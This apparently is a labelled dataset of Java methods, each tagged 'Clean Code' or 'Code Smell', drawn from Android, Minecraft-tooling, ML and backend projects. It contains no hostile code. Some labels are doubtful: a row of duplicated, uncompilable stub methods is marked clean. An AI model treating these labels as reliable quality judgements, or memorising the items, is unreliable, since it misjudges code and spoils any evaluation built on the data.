text,label,text_label
"public void drawDividers(Canvas canvas,int w,int h){
  if (mDividerPaint == null && (mTopDividerHeight > 0 || mBottomDividerHeight > 0 || mLeftDividerWidth > 0 || mRightDividerWidth > 0)) {
    mDividerPaint=new Paint();
  }
  if (mTopDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mTopDividerHeight);
    mDividerPaint.setColor(mTopDividerColor);
    if (mTopDividerAlpha < 255) {
      mDividerPaint.setAlpha(mTopDividerAlpha);
    }
    float y=mTopDividerHeight * 1f / 2;
    canvas.drawLine(mTopDividerInsetLeft,y,w - mTopDividerInsetRight,y,mDividerPaint);
  }
  if (mBottomDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mBottomDividerHeight);
    mDividerPaint.setColor(mBottomDividerColor);
    if (mBottomDividerAlpha < 255) {
      mDividerPaint.setAlpha(mBottomDividerAlpha);
    }
    float y=(float)Math.floor(h - mBottomDividerHeight * 1f / 2);
    canvas.drawLine(mBottomDividerInsetLeft,y,w - mBottomDividerInsetRight,y,mDividerPaint);
  }
  if (mLeftDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mLeftDividerWidth);
    mDividerPaint.setColor(mLeftDividerColor);
    if (mLeftDividerAlpha < 255) {
      mDividerPaint.setAlpha(mLeftDividerAlpha);
    }
    canvas.drawLine(0,mLeftDividerInsetTop,0,h - mLeftDividerInsetBottom,mDividerPaint);
  }
  if (mRightDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mRightDividerWidth);
    mDividerPaint.setColor(mRightDividerColor);
    if (mRightDividerAlpha < 255) {
      mDividerPaint.setAlpha(mRightDividerAlpha);
    }
    canvas.drawLine(w,mRightDividerInsetTop,w,h - mRightDividerInsetBottom,mDividerPaint);
  }
}",0,Clean Code
"private void processLoadedFilterPeersInternal(TLRPC.messages_Dialogs pinnedDialogs,TLRPC.messages_Dialogs pinnedRemoteDialogs,ArrayList<TLRPC.User> users,ArrayList<TLRPC.Chat> chats,ArrayList<MessagesController.DialogFilter> filtersToSave,SparseArray<MessagesController.DialogFilter> filtersToDelete,ArrayList<Integer> filtersOrder,HashMap<Integer,HashSet<Long>> filterDialogRemovals,HashSet<Integer> filtersUnreadCounterReset,Runnable onDone){
  boolean anythingChanged=false;
  putUsersAndChats(users,chats,true,false);
  for (int a=0, N=filtersToDelete.size(); a < N; a++) {
    deleteDialogFilterInternal(filtersToDelete.valueAt(a));
    anythingChanged=true;
  }
  for (  Integer id : filtersUnreadCounterReset) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(id);
    if (filter == null) {
      continue;
    }
    filter.pendingUnreadCount=-1;
  }
  for (  HashMap.Entry<Integer,HashSet<Long>> entry : filterDialogRemovals.entrySet()) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(entry.getKey());
    if (filter == null) {
      continue;
    }
    HashSet<Long> set=entry.getValue();
    for (    Long id : set) {
      filter.pinnedDialogs.delete(id);
    }
    anythingChanged=true;
  }
  for (int a=0, N=filtersToSave.size(); a < N; a++) {
    saveDialogFilterInternal(filtersToSave.get(a),false,true);
    anythingChanged=true;
  }
  boolean orderChanged=false;
  for (int a=0, N=dialogFilters.size(); a < N; a++) {
    MessagesController.DialogFilter filter=dialogFilters.get(a);
    int order=filtersOrder.indexOf(filter.id);
    if (filter.order != order) {
      filter.order=order;
      anythingChanged=true;
      orderChanged=true;
    }
  }
  if (orderChanged) {
    Collections.sort(dialogFilters,(o1,o2) -> {
      if (o1.order > o2.order) {
        return 1;
      }
 else       if (o1.order < o2.order) {
        return -1;
      }
      return 0;
    }
);
    saveDialogFiltersOrderInternal();
  }
  int remote=anythingChanged ? 1 : 2;
  calcUnreadCounters(true);
  getMessagesController().processLoadedDialogFilters(new ArrayList<>(dialogFilters),pinnedDialogs,pinnedRemoteDialogs,users,chats,null,remote,onDone);
}",1,Code Smell
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  ModrinthSearchResult modrinthSearchResult=(ModrinthSearchResult)previousPageResult;
  if (modrinthSearchResult != null && modrinthSearchResult.previousOffset >= modrinthSearchResult.totalResultCount) {
    ModrinthSearchResult emptyResult=new ModrinthSearchResult();
    emptyResult.results=new ModItem[0];
    emptyResult.totalResultCount=modrinthSearchResult.totalResultCount;
    emptyResult.previousOffset=modrinthSearchResult.previousOffset;
    return emptyResult;
  }
  HashMap<String,Object> params=new HashMap<>();
  StringBuilder facetString=new StringBuilder();
  facetString.append(""["");
  facetString.append(String.format(""[\""project_type:%s\""]"",searchFilters.isModpack ? ""modpack"" : ""mod""));
  if (searchFilters.mcVersion != null && !searchFilters.mcVersion.isEmpty())   facetString.append(String.format("",[\""versions:%s\""]"",searchFilters.mcVersion));
  facetString.append(""]"");
  params.put(""facets"",facetString.toString());
  params.put(""query"",searchFilters.name);
  params.put(""limit"",50);
  params.put(""index"",""relevance"");
  if (modrinthSearchResult != null)   params.put(""offset"",modrinthSearchResult.previousOffset);
  JsonObject response=mApiHandler.get(""search"",params,JsonObject.class);
  if (response == null)   return null;
  JsonArray responseHits=response.getAsJsonArray(""hits"");
  if (responseHits == null)   return null;
  ModItem[] items=new ModItem[responseHits.size()];
  for (int i=0; i < responseHits.size(); ++i) {
    JsonObject hit=responseHits.get(i).getAsJsonObject();
    items[i]=new ModItem(Constants.SOURCE_MODRINTH,hit.get(""project_type"").getAsString().equals(""modpack""),hit.get(""project_id"").getAsString(),hit.get(""title"").getAsString(),hit.get(""description"").getAsString(),hit.get(""icon_url"").getAsString());
  }
  if (modrinthSearchResult == null)   modrinthSearchResult=new ModrinthSearchResult();
  modrinthSearchResult.previousOffset+=responseHits.size();
  modrinthSearchResult.results=items;
  modrinthSearchResult.totalResultCount=response.get(""total_hits"").getAsInt();
  return modrinthSearchResult;
}",1,Code Smell
"private Pair<List<List<ItemDescriptorWithCount>>,ItemData> combinations(GeyserSession session,RecipeDisplay display,List<SlotDisplay> ingredients){
  Pair<Item,ItemData> pair=translateToOutput(session,display.result());
  if (pair == null || !pair.right().isValid()) {
    return null;
  }
  ItemData output=pair.right();
  if (!(pair.left() instanceof BedrockRequiresTagItem)) {
    output=output.toBuilder().tag(null).build();
  }
  boolean empty=true;
  boolean complexInputs=false;
  List<List<ItemDescriptorWithCount>> inputs=new ArrayList<>(ingredients.size());
  for (  SlotDisplay input : ingredients) {
    List<ItemDescriptorWithCount> translated=translateToInput(session,input);
    if (translated == null) {
      continue;
    }
    inputs.add(translated);
    if (translated.size() != 1 || translated.get(0) != ItemDescriptorWithCount.EMPTY) {
      empty=false;
    }
    complexInputs|=translated.size() > 1;
  }
  if (empty) {
    return null;
  }
  if (complexInputs) {
    long size=1;
    for (    List<ItemDescriptorWithCount> list : inputs) {
      size*=list.size();
      if (size > 500) {
        complexInputs=false;
        break;
      }
    }
    if (complexInputs) {
      return Pair.of(Lists.cartesianProduct(inputs),output);
    }
  }
  int totalSimpleRecipes=inputs.stream().mapToInt(List::size).max().orElse(1);
  inputs=inputs.stream().map(descriptors -> descriptors.stream().sorted(ItemDescriptorWithCountComparator.INSTANCE).collect(Collectors.toList())).collect(Collectors.toList());
  List<List<ItemDescriptorWithCount>> finalRecipes=new ArrayList<>(totalSimpleRecipes);
  for (int i=0; i < totalSimpleRecipes; i++) {
    int current=i;
    finalRecipes.add(inputs.stream().map(descriptors -> {
      if (descriptors.size() > current) {
        return descriptors.get(current);
      }
      return descriptors.get(0);
    }
).toList());
  }
  return Pair.of(finalRecipes,output);
}",1,Code Smell
"/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
",0,Clean Code
"/** 
 * 
 * @return 
 */
public static SysResult ok(){
  return new SysResult(200,""ok"",null);
}
/** 
 * 
 * @param data vo
 * @return vo
 */
public static SysResult ok(Object data){
  return new SysResult(200,""ok"",data);
}",0,Clean Code
"@Override public DatasourceDTO get(Long datasourceId) throws DEException {
  DatasourceDTO datasourceDTO=new DatasourceDTO();
  CoreDatasource datasource=datasourceMapper.selectById(datasourceId);
  BeanUtils.copyBean(datasourceDTO,datasource);
  TypeReference<List<ApiDefinition>> listTypeReference=new TypeReference<List<ApiDefinition>>(){
  }
;
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.API.toString())) {
    List<ApiDefinition> apiDefinitionList=JsonUtil.parseList(datasourceDTO.getConfiguration(),listTypeReference);
    List<ApiDefinition> apiDefinitionListWithStatus=new ArrayList<>();
    int success=0;
    for (    ApiDefinition apiDefinition : apiDefinitionList) {
      String status=null;
      if (StringUtils.isNotEmpty(datasourceDTO.getStatus())) {
        JsonNode jsonNode=null;
        try {
          jsonNode=objectMapper.readTree(datasourceDTO.getStatus());
        }
 catch (        Exception e) {
          DEException.throwException(e);
        }
        for (        JsonNode node : jsonNode) {
          if (node.get(""name"").asText().equals(apiDefinition.getName())) {
            status=node.get(""status"").asText();
          }
        }
        apiDefinition.setStatus(status);
      }
      if (StringUtils.isNotEmpty(status) && status.equalsIgnoreCase(""Success"")) {
        success++;
      }
      CoreDatasourceTaskLog log=datasourceTaskServer.lastSyncLogForTable(datasourceId,apiDefinition.getDeTableName());
      if (log != null) {
        apiDefinition.setUpdateTime(log.getStartTime());
      }
      apiDefinitionListWithStatus.add(apiDefinition);
    }
    datasourceDTO.setApiConfigurationStr(new String(Base64.getEncoder().encode(Objects.requireNonNull(JsonUtil.toJSONString(apiDefinitionListWithStatus)).toString().getBytes())));
    if (success == apiDefinitionList.size()) {
      datasourceDTO.setStatus(""Success"");
    }
 else {
      if (success > 0 && success < apiDefinitionList.size()) {
        datasourceDTO.setStatus(""Warning"");
      }
 else {
        datasourceDTO.setStatus(""Error"");
      }
    }
    CoreDatasourceTask coreDatasourceTask=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    TaskDTO taskDTO=new TaskDTO();
    BeanUtils.copyBean(taskDTO,coreDatasourceTask);
    datasourceDTO.setSyncSetting(taskDTO);
    CoreDatasourceTask task=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    if (task != null) {
      datasourceDTO.setLastSyncTime(task.getStartTime());
    }
  }
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.Excel.toString())) {
    datasourceDTO.setFileName(ExcelUtils.getFileName(datasource));
    datasourceDTO.setSize(ExcelUtils.getSize(datasource));
  }
  datasourceDTO.setConfiguration(new String(Base64.getEncoder().encode(datasourceDTO.getConfiguration().getBytes())));
  datasourceDTO.setCreator(coreUserManage.getUserName(Long.valueOf(datasourceDTO.getCreateBy())));
  return datasourceDTO;
}",1,Code Smell
"private void onSubscribe(int buttonState){
  if (!mIsMetadataLoaded) {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    return;
  }
  if (!YouTubeSignInService.instance().isSigned()) {
    MessageHelpers.showMessage(getContext(),R.string.msg_signed_users_only);
    return;
  }
  if (buttonState == PlayerUI.BUTTON_OFF) {
    callMediaItemObservable(mMediaItemService::subscribeObserve);
  }
 else {
    callMediaItemObservable(mMediaItemService::unsubscribeObserve);
  }
  getPlayer().getVideo().isSubscribed=buttonState == PlayerUI.BUTTON_OFF;
  getPlayer().setButtonState(R.id.action_subscribe,buttonState == PlayerUI.BUTTON_OFF ? PlayerUI.BUTTON_ON : PlayerUI.BUTTON_OFF);
}
",0,Clean Code
"private void copySoFile(){
  String[] existLibPathArray=new String[3];
  int arrayIndex=0;
  for (  String libPath : APK_LIB_PATH_ARRAY) {
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    if (apkSoFullPathFile.exists()) {
      existLibPathArray[arrayIndex]=libPath;
      arrayIndex++;
    }
  }
  if (arrayIndex == 0) {
    String libPath=APK_LIB_PATH_ARRAY[0];
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    apkSoFullPathFile.mkdirs();
    existLibPathArray[arrayIndex]=libPath;
  }
  for (  String libPath : existLibPathArray) {
    if (libPath != null && !libPath.isEmpty()) {
      String apkSoFullPath=fullLibPath(libPath);
      copyLibFile(apkSoFullPath,mSoFilePathMap.get(libPath));
    }
  }
  if (xposedModuleArray != null && xposedModuleArray.length > 0) {
    int index=0;
    for (    String modulePath : xposedModuleArray) {
      modulePath=modulePath.trim();
      if (modulePath == null || modulePath.length() == 0) {
        continue;
      }
      File moduleFile=new File(modulePath);
      if (!moduleFile.exists()) {
        continue;
      }
      for (      String libPath : existLibPathArray) {
        if (libPath != null && !libPath.isEmpty()) {
          String apkSoFullPath=fullLibPath(libPath);
          String outputModuleName=XPOSED_MODULE_FILE_NAME_PREFIX + index + SO_FILE_SUFFIX;
          File outputModuleSoFile=new File(apkSoFullPath,outputModuleName);
          FileUtils.copyFile(moduleFile,outputModuleSoFile);
        }
      }
      index++;
    }
  }
}",1,Code Smell
"/** 
 * 
 * @param result
 * @param minPixelNum 
 * @param minSpace    
 * @return
 */
public static List<int[]> groupResult(int[] result,int minPixelNum,int minSpace){
  List<int[]> bwY=new ArrayList<>();
  if (result.length > 0) {
    int targetStart=-1;
    int cal=0;
    for (int i=0; i < result.length; i++) {
      if (targetStart == -1 && result[i] > minPixelNum) {
        targetStart=i;
      }
 else       if (targetStart != -1) {
        if (result[i] <= minPixelNum) {
          if (cal > minSpace) {
            bwY.add(new int[]{targetStart,i - cal});
            targetStart=-1;
            cal=0;
          }
 else {
            cal++;
          }
        }
 else {
          cal=0;
        }
      }
    }
    if (targetStart != -1 && cal <= minSpace) {
      bwY.add(new int[]{targetStart,result.length - 1});
    }
  }
  return bwY;
}",1,Code Smell
"private void addTaskEdge(List<WorkflowTaskRelation> workflowTaskRelations){
  for (  WorkflowTaskRelation workflowTaskRelation : workflowTaskRelations) {
    long pre=workflowTaskRelation.getPreTaskCode();
    long post=workflowTaskRelation.getPostTaskCode();
    if (pre > 0 && post > 0) {
      if (!taskDefinitionCodeMap.containsKey(pre)) {
        throw new IllegalArgumentException(""Cannot find task: "" + pre);
      }
      if (!taskDefinitionCodeMap.containsKey(post)) {
        throw new IllegalArgumentException(""Cannot find task: "" + post);
      }
      TaskDefinition preTask=checkNotNull(taskDefinitionCodeMap.get(pre),""Cannot find task: "" + pre);
      TaskDefinition postTask=checkNotNull(taskDefinitionCodeMap.get(post),""Cannot find task: "" + pre);
      List<String> predecessorsTasks=predecessors.get(postTask.getName());
      if (predecessorsTasks.contains(preTask.getName())) {
        throw new IllegalArgumentException(""The task relation from "" + preTask.getName() + "" to ""+ postTask.getName()+ "" is already exists"");
      }
      predecessorsTasks.add(preTask.getName());
      List<String> successTasks=successors.get(preTask.getName());
      if (successTasks.contains(postTask.getName())) {
        throw new IllegalArgumentException(""The task relation from "" + preTask.getName() + "" to ""+ postTask.getName()+ "" is already exists"");
      }
      successTasks.add(postTask.getName());
    }
    if (pre <= 0 && post <= 0) {
      throw new IllegalArgumentException(""The task relation from "" + pre + "" to ""+ post+ "" is invalid"");
    }
  }
}",1,Code Smell
"private void insertTeslaUser(TeslaServiceUserDO teslaServiceUserDO){
  UserDO userDo=new UserDO();
  userDo.setEmpId(teslaServiceUserDO.getEmployeeId());
  String bucUserId=teslaServiceUserDO.getBucUserId();
  if (!StringUtils.isBlank(bucUserId)) {
    if (bucUserId.endsWith("".0"")) {
      bucUserId=bucUserId.substring(0,bucUserId.indexOf("".""));
    }
    userDo.setBucId(Long.parseLong(bucUserId));
  }
  userDo.setTenantId(Constants.DEFAULT_TENANT_ID);
  userDo.setLoginName(teslaServiceUserDO.getUsername());
  userDo.setNickName(teslaServiceUserDO.getNickname());
  userDo.setEmail(teslaServiceUserDO.getEmail());
  userDo.setPhone(teslaServiceUserDO.getMobilephone());
  userDo.setAliww(teslaServiceUserDO.getAliww());
  userDo.setGmtCreate(new Date());
  userDo.setIsLocked((byte)(userDo.getIsLocked() == 0 ? 1 : 0));
  userDo.setSecretKey(teslaServiceUserDO.getSecretkey());
  userDo.setUserId(UserUtil.getUserId(userDo));
  log.info(""insert user:{}"",userDo);
  userMapper.insert(userDo);
}",0,Clean Code
"@Override public ONNXNode writeONNXGraph(ONNXRef<?> input){
  ONNXContext onnx=input.onnxContext();
  svm_model model=models.get(0);
  int numOneVOne=model.label.length * (model.label.length - 1) / 2;
  int numFeatures=featureIDMap.size();
  Map<String,Object> attributes=new HashMap<>();
  attributes.put(""classlabels_ints"",model.label);
  float[] coefficients=new float[model.l * (model.nr_class - 1)];
  for (int i=0; i < model.nr_class - 1; i++) {
    for (int j=0; j < model.l; j++) {
      coefficients[i * model.l + j]=(float)model.sv_coef[i][j];
    }
  }
  attributes.put(""coefficients"",coefficients);
  attributes.put(""kernel_params"",new float[]{(float)model.param.gamma,(float)model.param.coef0,model.param.degree});
  attributes.put(""kernel_type"",KernelType.getKernelType(model.param.kernel_type).name());
  float[] rho=new float[model.rho.length];
  for (int i=0; i < rho.length; i++) {
    rho[i]=(float)-model.rho[i];
  }
  attributes.put(""rho"",rho);
  float[] supportVectors=new float[model.l * numFeatures];
  for (int j=0; j < model.l; j++) {
    svm_node[] sv=model.SV[j];
    for (    svm_node svm_node : sv) {
      int idx=(j * numFeatures) + svm_node.index;
      supportVectors[idx]=(float)svm_node.value;
    }
  }
  attributes.put(""support_vectors"",supportVectors);
  attributes.put(""vectors_per_class"",Arrays.copyOf(model.nSV,model.label.length));
  if (generatesProbabilities) {
    attributes.put(""prob_a"",Arrays.copyOf(Util.toFloatArray(model.probA),numOneVOne));
    attributes.put(""prob_b"",Arrays.copyOf(Util.toFloatArray(model.probB),numOneVOne));
  }
  List<ONNXNode> outputs=input.apply(ONNXOperators.SVM_CLASSIFIER,Arrays.asList(""pred_label"",""svm_output""),attributes);
  ONNXNode predLabel=outputs.get(0);
  ONNXNode svmOutput=outputs.get(1);
  ONNXNode ungatheredOutput=svmOutput;
  if (!generatesProbabilities) {
    if (model.nr_class == 2) {
      ONNXInitializer negOne=onnx.constant(""minus_one"",-1.0f);
      ungatheredOutput=writeDecisionFunction(svmOutput.apply(ONNXOperators.MUL,negOne));
    }
 else {
      ungatheredOutput=writeDecisionFunction(svmOutput);
    }
  }
  int[] backwardsLibSVMMapping=new int[model.label.length];
  for (int i=0; i < model.label.length; i++) {
    backwardsLibSVMMapping[model.label[i]]=i;
  }
  ONNXInitializer indices=onnx.array(""label_indices"",backwardsLibSVMMapping);
  return ungatheredOutput.apply(ONNXOperators.GATHER,indices,Collections.singletonMap(""axis"",1));
}",1,Code Smell
"@Override public void hook() throws Throwable {
  if (Helper.prefs.getBoolean(""switch_mainswitch"",false) && Helper.prefs.getBoolean(""switch_reddot"",false)) {
    XposedBridge.hookAllMethods(FeedsTabsFragment,""onUnReadCountLoaded"",XC_MethodReplacement.returnConstant(null));
    if (BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility != null)     XposedBridge.hookMethod(BaseFeedFollowAvatarViewHolder_setUnreadTipVisibility,XC_MethodReplacement.returnConstant(null));
    if (ZHMainTabLayout_updateBadges != null)     XposedBridge.hookMethod(ZHMainTabLayout_updateBadges,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemView_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BottomNavMenuItemViewForIconOnly_setUnreadCount != null)     XposedBridge.hookMethod(BottomNavMenuItemViewForIconOnly_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (BaseBottomNavMenuItemView_setNavBadge != null)     XposedBridge.hookMethod(BaseBottomNavMenuItemView_setNavBadge,XC_MethodReplacement.returnConstant(null));
    XposedHelpers.findAndHookMethod(NotiMsgModel,""getUnreadCount"",XC_MethodReplacement.returnConstant(0));
    if (NotiUnreadCountKt_hasUnread != null)     XposedBridge.hookMethod(NotiUnreadCountKt_hasUnread,XC_MethodReplacement.returnConstant(false));
    if (IconWithDotAndCountView_setUnreadCount != null)     XposedBridge.hookMethod(IconWithDotAndCountView_setUnreadCount,XC_MethodReplacement.returnConstant(null));
    if (CountDotView_setUnreadCount != null)     XposedBridge.hookMethod(CountDotView_setUnreadCount,new XC_MethodReplacement(){
      @Override protected Object replaceHookedMethod(      MethodHookParam param){
        View obj=(View)param.thisObject;
        obj.setVisibility(View.GONE);
        return null;
      }
    }
);
    if (ViewModel != null) {
      XposedHelpers.findAndHookConstructor(ViewModel,View.class,new XC_MethodHook(){
        @Override protected void afterHookedMethod(        MethodHookParam param){
          try {
            ViewGroup view=(ViewGroup)param.args[0];
            if (view.getChildCount() == 2) {
              view.setVisibility(View.GONE);
            }
          }
 catch (          Throwable ignored) {
          }
        }
      }
);
    }
    if (RevisitView_getCanShowRedDot != null)     XposedBridge.hookMethod(RevisitView_getCanShowRedDot,XC_MethodReplacement.returnConstant(false));
  }
}",1,Code Smell
"@Override public void clearSearch(){
  mSearchQuery=null;
  for (  VideoGroupObjectAdapter adapter : mSearchGroupAdapters.values()) {
    adapter.clear();
  }
  mSearchGroupAdapters.clear();
  ObjectAdapter resultsAdapter=getResultsAdapter();
  if (resultsAdapter == null) {
    return;
  }
  int size=resultsAdapter.size();
  int index=0;
  for (int i=0; i < size; i++) {
    Object row=resultsAdapter.get(index);
    if (row instanceof ListRow && ((ListRow)row).getAdapter() instanceof VideoGroupObjectAdapter) {
      detachAdapter(index);
    }
 else {
      index++;
    }
  }
}",0,Clean Code
"/** 
 * {@inheritDoc} 
 */
@Override public NDList batchify(NDList[] inputs){
  int batchSize=inputs.length;
  int numInputKinds=inputs[0].size();
  if (numInputKinds == 0) {
    return new NDList();
  }
  try {
    NDList result=new NDList(numInputKinds);
    for (int i=0; i < numInputKinds; i++) {
      NDList inputsOfKind=new NDList(batchSize);
      String inputName=inputs[0].get(i).getName();
      for (      NDList input : inputs) {
        inputsOfKind.add(input.get(i));
      }
      NDArray stacked=NDArrays.stack(new NDList(inputsOfKind));
      stacked.setName(inputName);
      result.add(stacked);
    }
    return result;
  }
 catch (  IndexOutOfBoundsException|EngineException e) {
    for (    NDList input : inputs) {
      if (input.size() != numInputKinds) {
        throw new IllegalArgumentException(""You cannot batch data with different numbers of inputs"",e);
      }
    }
    for (int i=0; i < numInputKinds; i++) {
      Shape kindDataShape=inputs[0].get(i).getShape();
      DataType kindDataType=inputs[0].get(i).getDataType();
      for (      NDList input : inputs) {
        NDArray currInput=input.get(i);
        if (!currInput.getShape().equals(kindDataShape)) {
          throw new IllegalArgumentException(""You cannot batch data with different input shapes"" + currInput.getShape() + "" vs ""+ kindDataShape,e);
        }
        if (!currInput.getDataType().equals(kindDataType)) {
          throw new IllegalArgumentException(""You cannot batch data with different input data types"",e);
        }
      }
    }
    throw e;
  }
}",1,Code Smell
"@Override public CfLogisticsStorehousePlatformCargoTypeExample getExampleByQuery(CfLogisticsStorehousePlatformCargoTypeQuery cfLogisticsStorehousePlatformCargoTypeQuery){
  CfLogisticsStorehousePlatformCargoTypeExample cfLogisticsStorehousePlatformCargoTypeExample=new CfLogisticsStorehousePlatformCargoTypeExample();
  CfLogisticsStorehousePlatformCargoTypeExample.Criteria criteria=cfLogisticsStorehousePlatformCargoTypeExample.createCriteria();
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId() != null) {
    criteria.andLogisticsStorehouseIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId() != null) {
    criteria.andLogisticsStorehousePlatformIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds().size() > 0) {
    criteria.andLogisticsStorehousePlatformIdIn(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId() != null) {
    criteria.andFactoryIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType() != null) {
    criteria.andCargoTypeEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType());
  }
  if (StringUtils.isNotEmpty(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy())) {
    cfLogisticsStorehousePlatformCargoTypeExample.setOrderByClause(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getPage() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getSize() != null) {
    PageHelper.startPage(cfLogisticsStorehousePlatformCargoTypeQuery.getPage(),cfLogisticsStorehousePlatformCargoTypeQuery.getSize());
  }
  return cfLogisticsStorehousePlatformCargoTypeExample;
}",0,Clean Code
"/** 
 * 
 * @param filePath 
 * @return truealse
 */
public static boolean deleteDirectory(String filePath){
  boolean flag;
  if (filePath == null || filePath.length() == 0)   return false;
  if (!filePath.endsWith(File.separator)) {
    filePath=filePath + File.separator;
  }
  File dirFile=new File(filePath);
  try {
    if (!dirFile.exists() || !dirFile.isDirectory()) {
      return false;
    }
    flag=true;
    File[] files=dirFile.listFiles();
    for (    File file : files) {
      if (file.isFile()) {
        flag=deleteFile(file.getAbsolutePath());
      }
 else {
        flag=deleteDirectory(file.getAbsolutePath());
      }
      if (!flag)       break;
    }
    if (!flag)     return false;
  }
 catch (  Exception e) {
    return false;
  }
  return dirFile.delete();
}",0,Clean Code
